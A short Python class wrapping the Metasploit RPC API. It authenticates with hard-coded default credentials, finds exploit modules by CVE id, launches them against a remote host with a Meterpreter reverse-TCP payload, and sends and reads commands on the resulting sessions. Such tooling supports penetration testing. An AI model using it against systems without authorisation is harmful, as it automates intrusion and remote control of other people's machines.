import requests
import json
import time

class MetasploitClient:
    def __init__(self, user="msf", password="abc123", host="127.0.0.1", port=55553):
        self.url = f"http://{host}:{port}/api/"
        self.headers = {"Content-Type": "application/json"}
        self.token = self.authenticate(user, password)

    def authenticate(self, user, password):
        payload = {
            "method": "auth.login",
            "params": [user, password],
            "id": 1
        }
        response = requests.post(self.url, headers=self.headers, json=payload)
        result = response.json()
        if result.get("result") == "success":
            return result.get("token")
        raise Exception("Authentication failed.")

    def call(self, method, params=None):
        payload = {
            "method": method,
            "token": self.token,
            "params": params or [],
            "id": 1
        }
        response = requests.post(self.url, headers=self.headers, json=payload)
        return response.json()

    def get_cve_modules(self, cve_id):
        modules = self.call("module.exploits")["modules"]
        return [m for m in modules if cve_id.lower() in m.lower()]

    def exploit_target(self, module_path, rhost, rport=80, payload="windows/meterpreter/reverse_tcp", lhost="127.0.0.1", lport="4444"):
        opts = {
            "RHOSTS": rhost,
            "RPORT": str(rport),
            "LHOST": lhost,
            "LPORT": str(lport),
            "PAYLOAD": payload
        }
        return self.call("module.execute", ["exploit", module_path, opts])

    def list_sessions(self):
        return self.call("session.list").get("sessions", {})

    def send_command(self, sid, command):
        return self.call("session.meterpreter_write", [sid, command + "\n"])

    def read_response(self, sid):
        return self.call("session.meterpreter_read", [sid])
